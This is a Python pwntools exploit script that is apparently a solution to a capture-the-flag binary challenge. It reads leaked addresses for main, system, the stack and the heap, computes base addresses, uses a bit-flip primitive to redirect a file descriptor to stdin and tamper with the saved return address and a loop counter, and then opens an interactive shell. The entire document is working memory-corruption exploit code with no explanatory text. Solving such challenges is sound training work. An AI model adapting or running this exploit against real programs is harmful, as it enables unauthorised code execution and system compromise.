from pwn import *

def flipper(src,tar,src_pointer):
    #src = int("0x123abc",16)
    #tar = int("0xfed987",16)
    hlp = src^tar
    pack = [1,2,4,8,16,32,64,128]
    for j in range(0,6):
        flip = 0
        byte = hlp & 0xff
        print(hex(byte))
        hlp = hlp >> 8
        print(hex(hlp))                                                      
        print("byte :" + hex(j+1))
        
        for i in pack :
            if(byte & i !=0):
                print("flip the bit number :"+hex(flip))
                p.recvuntil(">")
                p.sendline(hex(src_pointer))
                print(hex(src_pointer))
                p.sendline(str(flip))

            flip+=1
        src_pointer+=1


p=process('./main')
#p=remote('chall.0xfun.org','16912')
#p = remote('127.0.0.1','5000')

#gdb.attach(p)
#pause()

counter_off = 0x1fc1c
rip_off = 130104

p.recvuntil("&main = 0x")
leak =int(p.recvn(12),16)
pie_base = leak - 5125
fd_addr = pie_base + 0x4050

p.recvuntil("&system = 0x")
system =int(p.recvn(12),16)
libc = system - 0x53ac0
stdin = libc + 0x2088e0

p.recvuntil("&address = 0x")
stack_base = int(p.recvn(12),16)-130080
saved_rip = stack_base +rip_off
counter_addr = stack_base + counter_off

p.recvuntil("sbrk(NULL) = 0x")
heap =int(p.recvn(12),16)
heap_base = heap - 0x21000
fd = heap_base + 0x310


#gdb.attach(p)
print(hex(counter_addr))
p.recvuntil(">")
p.sendline(hex(counter_addr+3))
p.sendline(b"7")

flipper(fd,stdin,fd_addr)

p.recvuntil(">")
p.sendline(hex(saved_rip))
p.sendline(b"3")

p.recvuntil(">")
p.sendline(hex(counter_addr+3))
p.sendline(b"7")


#gdb.attach(p)
p.interactive()
